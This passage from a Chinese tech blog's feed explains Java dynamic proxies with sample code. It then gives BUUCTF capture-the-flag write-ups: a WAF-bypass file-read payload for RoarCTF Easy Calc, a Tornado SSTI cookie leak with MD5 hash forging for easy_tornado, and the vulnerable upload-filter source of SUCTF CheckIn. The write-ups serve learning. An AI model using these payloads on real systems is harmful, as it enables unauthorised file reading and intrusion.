class="hljs-type">boolean</span> <span class="hljs-title function_">isProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> &#123;<br>        <span class="hljs-keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 向指定的类加载器中定义一个类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader 类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name   类名</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> b      类字节码</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> off    截取开始位置</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> len    截取长度</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JVM创建的类Class对象</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class <span class="hljs-title function_">defineClass0</span><span class="hljs-params">(ClassLoader loader, String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>用的最多的就是<code>newProxyInstance()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">  * 创建动态代理类实例</span><br><span class="hljs-comment">  *</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> loader     指定动态代理类的类加载器</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组，这里的对象是接口实现类</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> h          动态代理处理类</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@return</span> 返回动态代理生成的代理类实例</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span><br><span class="hljs-comment">  */</span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span><br>         <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>     ...<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="Invocationhandler"><a href="#Invocationhandler" class="headerlink" title="Invocationhandler"></a>Invocationhandler</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045587.png" alt="QQ截图20220225191721"></p><p>其中参数</p><p><code>proxy</code>：jdk创建的代理对象，无需赋值</p><p><code>method</code>：目标类中的方法</p><p><code>args参数</code>：目标类中的方法所接收的参数。<br>并且这三个参数都是jdk自带的！！</p><p>如何使用这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> Object demo;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Demo1</span><span class="hljs-params">(Object demo)</span> &#123;<br>        <span class="hljs-built_in">this</span>.demo = demo;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;开始&quot;</span>);<br>       Object res=  method.invoke(demo, args);<br>        System.out.println(<span class="hljs-string">&quot;结束&quot;</span>);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>重写invoke方法，把原来静态代理中代理类要完成的功能，放在重写之后的invoke方法中实现。</strong></p><p><strong>invoke方法表示代理对象要执行的功能代码。</strong></p><h3 id="newProxyInstance"><a href="#newProxyInstance" class="headerlink" title="newProxyInstance"></a>newProxyInstance</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader,</span><br><span class="hljs-params">                                          Class&lt;?&gt;[] interfaces,</span><br><span class="hljs-params">                                          InvocationHandler h)</span><br>        <span class="hljs-keyword">throws</span> IllegalArgumentException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (h == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();<br>        &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Look up or generate the designated proxy class.</span><br><span class="hljs-comment">         */</span><br>        Class&lt;?&gt; cl = getProxyClass0(loader, interfaces); <span class="hljs-comment">// stack walk magic: do not refactor</span><br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Invoke its constructor with the designated invocation handler.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ih</span> <span class="hljs-operator">=</span> h;<br>            <span class="hljs-type">SecurityManager</span> <span class="hljs-variable">sm</span> <span class="hljs-operator">=</span> System.getSecurityManager();<br>            <span class="hljs-keyword">if</span> (sm != <span class="hljs-literal">null</span> &amp;&amp; ProxyAccessHelper.needsNewInstanceCheck(cl)) &#123;<br>                <span class="hljs-comment">// create proxy instance with doPrivilege as the proxy class may</span><br>                <span class="hljs-comment">// implement non-public interfaces that requires a special permission</span><br>                <span class="hljs-keyword">return</span> AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Object&gt;() &#123;<br>                    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                        <span class="hljs-keyword">return</span> newInstance(cons, ih);<br>                    &#125;<br>                &#125;);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> newInstance(cons, ih);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InternalError</span>(e.toString());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>关键函数:<code>Class&lt;?&gt; cl = getProxyClass0(loader, intfs);</code>主要就是生成代理类。</p><p>JDK会生成一个叫$Proxy0的代理类，这个类文件是放在内存中的，在创建代理类对象时，通过反射机制获得这个类的构造方法，然后创建代理类实例。</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="代理类-1"><a href="#代理类-1" class="headerlink" title="代理类"></a>代理类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Company</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> Object factory;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getFactory</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> factory;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFactory</span><span class="hljs-params">(Object factory)</span> &#123;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),<span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        before();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> method.invoke(factory,args);<br>        after();<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;开始&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;结束&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),<span class="hljs-built_in">this</span>);<br>&#125; #这一段代码其实就是为了创建代理对象，并且会执行hander中的invoke方法<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> method.invoke(factory,args);<br>#这个其实就是为了实现修改的部分，其 <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;...&#125;会被<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;...&#125;触发<br></code></pre></td></tr></table></figure><h4 id="创建接口"><a href="#创建接口" class="headerlink" title="创建接口"></a>创建接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AppleShop</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BananerShop</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="实现接口"><a href="#实现接口" class="headerlink" title="实现接口"></a>实现接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleShopReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AppleShop</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;吃苹果啦&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BannerShopReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BananerShop</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;吃香蕉啦&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="实现类-2"><a href="#实现类-2" class="headerlink" title="实现类"></a>实现类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AppleShopReal</span> <span class="hljs-variable">appleShopReal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleShopReal</span>();<br>        <span class="hljs-type">Company</span> <span class="hljs-variable">company</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Company</span>();<br>        company.setFactory(appleShopReal);<br>        <span class="hljs-type">AppleShop</span> <span class="hljs-variable">proxyInstance</span> <span class="hljs-operator">=</span> (AppleShop) company.getProxyInstance();<br>        proxyInstance.Apple();<br><br>        System.out.println(<span class="hljs-string">&quot;-------------------&quot;</span>);<br><br>        <span class="hljs-type">BannerShopReal</span> <span class="hljs-variable">bannerShopReal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BannerShopReal</span>();<br>        company.setFactory(bannerShopReal);<br>        <span class="hljs-type">BananerShop</span> <span class="hljs-variable">proxyInstance1</span> <span class="hljs-operator">=</span> (BananerShop) company.getProxyInstance();<br>        proxyInstance1.Bananer();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在我翻阅大佬博客的时候有几点值得注意的地方。<br> <code>AppleShop proxyInstance = (AppleShop) company.getProxyInstance();</code>和<code>BananerShop proxyInstance1 = (BananerShop) company.getProxyInstance();</code></p><p><strong>不能强转实现类。</strong>原因：不能用接口的实现类来转换Proxy的实现类，因为他们是同级的（代理类本身继承了Proxy），应该用共同的接口来转换。<br>成功。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045630.png" alt="QQ截图20220225204149"></p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/2022/02/24/BUUCTF/"/>
    <url>/2022/02/24/BUUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><p>有点乱，之前在等博客开通。</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>配置了好久的图床，之前用hexo+github的服务器搭建博客。现在重新用vps搭建博客，是真的麻烦，还要申请备案啥的。<br>给自己取了一个好听的id名—-Xsw6_a，但是很难受，因为很多时候下划线(_)，是非法字符。<br>先来做做这个比较简单的题嘿嘿。<br>emmm又要重新启动一下环境。<br>先来看看源代码。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214131745.png" alt="QQ截图20220214131745"></p><p>值得注意的几点。<br><strong>1.I’ve set up WAF to ensure security.</strong></p><p><strong>2.calc.php</strong></p><p>进入链接：<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a></p><p>读取代码：<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214132112.png" alt="QQ截图20220214132112"></p><p>这里对我来说的新知识，了解一下foreach函数。（菜鸟教程）<br>正则过滤了一些字符。<br>构造num&#x3D;print_r(scandir(chr(47))),发现报错。<br>emmm….不会了。百度。<br>只需要将num之前打一个空格。<br>新链接：<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a>? num&#x3D;print_r(scandir(chr(47)))<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214133023.png" alt="QQ截图20220214133023"></p><p>读取f1agg。<br>这里附上字符串转ascii的java代码，就当复习java基础语法了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/f1agg&quot;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length();i++)&#123;<br>            <span class="hljs-type">int</span> temp=(<span class="hljs-type">int</span>)a.charAt(i);<br>            <span class="hljs-comment">//得到当前字符的ascii</span><br>            System.out.println(temp);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>完整链接：<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a>? num&#x3D;print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<br>得到flag。</p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>随便点点发现url中<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=7e8d78ce04c76c46dbe7fcee211c3aed">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=7e8d78ce04c76c46dbe7fcee211c3aed</a><br>filehash的值，emmm第一眼就觉得是加密。<br>接着发现<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214134238.png" alt="QQ截图20220214134238"></p><p>直接上加密。<br>但是找了一圈没有找到cookie。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214134456.png" alt="QQ截图20220214134456"></p><p>回头又想到render。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214135041.png" alt="QQ截图20220214135041"></p><p>没有思路，就又查找wp了。<br>很奇妙，竟然联系到题目。跟着wp提示做一下。<br>一路跟到底…emmm<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214140206.png" alt="QQ截图20220214140206"></p><p><strong>总结：handler 指向RequestHandler</strong></p><p><strong>而RequestHandler.settings又指向self.application.settings</strong></p><p><strong>所有handler.settings就指向RequestHandler.application.settings了！</strong></p><p>这里如果直接访问，会出现500的错误。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214140724.png" alt="QQ截图20220214140724"></p><p>所以这里就体现出了，为什么要间接访问。<br>然后自己调试的一些问题：这里好像链接构造成：0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81&#x2F;error?msg&#x3D;</p><p>msg后面输入什么，页面就会返回什么。跟作者说的ssti我觉得有问题。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214141140.png" alt="QQ截图20220214141140"></p><p>这里如果是计算表达式就是不行。但是这里确实是符合ssti，emmm不理解。</p><p>管他呢，继续做叭。<br>构造链接：<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/error?msg=">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/error?msg=</a></p><p>得到cookie，然后就去写代码咯。自己对着敲一遍。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-comment">#创建MD5加密对象</span><br><span class="hljs-built_in">hash</span>.update(<span class="hljs-string">&quot;/fllllllllllllag&quot;</span>.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br><span class="hljs-comment">#更新对象要加密的字符串，要先UTF-8编码成二进制，因为md5只加密二进制</span><br>s1=<span class="hljs-built_in">hash</span>.hexdigest()<br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-built_in">hash</span>.update((<span class="hljs-string">&quot;20d70faf-6981-4604-ba00-9f57cb0c2569&quot;</span>+s1).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hash</span>.hexdigest())<br></code></pre></td></tr></table></figure><p>就是注释md5加密又学到知识了。</p><p>最终链接:<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/fllllllllllllag&amp;filehash=cb968bb0bf9e59ccb66e18a9ed1a6674">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/fllllllllllllag&amp;filehash=cb968bb0bf9e59ccb66e18a9ed1a6674</a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1、如果url中参数屏蔽了字母，可在参数前+一个小空格。</p><p>2、scandir、print_f、file_get_contents等函数</p><p>3、看到render参数可联系到模板，联系到ssti，Tornado提供别名快速访问对象。</p><p>4、RequestHandler.application.settings目前不知道具体作用，中文翻译一下  请求处理程序 .申请.设置 估摸这就是查看cookie？</p><p>当然这里直接通过 handler.settings。</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>打开题目是上传文件。有源码先看源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>// error_reporting(0);<br>$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);<br>if (!file_exists($userdir)) &#123;<br>    mkdir($userdir, 0777, true);<br>&#125;<br>file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);<br>if (isset($_POST[&quot;upload&quot;])) &#123;<br>    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];<br>    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];<br>    if (!$tmp_name) &#123;<br>        die(&quot;filesize too big!&quot;);<br>    &#125;<br>    if (!$name) &#123;<br>        die(&quot;filename cannot be empty!&quot;);<br>    &#125;<br>    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);<br>    if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123;<br>        die(&quot;illegal suffix!&quot;);<br>    &#125;<br>    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;<br>        die(&quot;&amp;lt;? in contents!&quot;);<br>    &#125;<br>    $image_type = exif_imagetype($tmp_name);<br>    if (!$image_type) &#123;<br>        die(&quot;exif_imagetype:not image!&quot;);<br>    &#125;<br>    $upload_file_path = $userdir . &quot;/&quot; . $name;<br>    move_uploaded_file($tmp_name, $upload_file_path);<br>    echo &quot;Your dir &quot; . $userdir. &#x27; &lt;br&gt;&#x27;;<br>    echo &#x27;Your files : &lt;br&gt;&#x27;;<br>    var_dump(scandir($userdir));<br>&#125;<br></code></pre></td></tr></table></figure><p><img 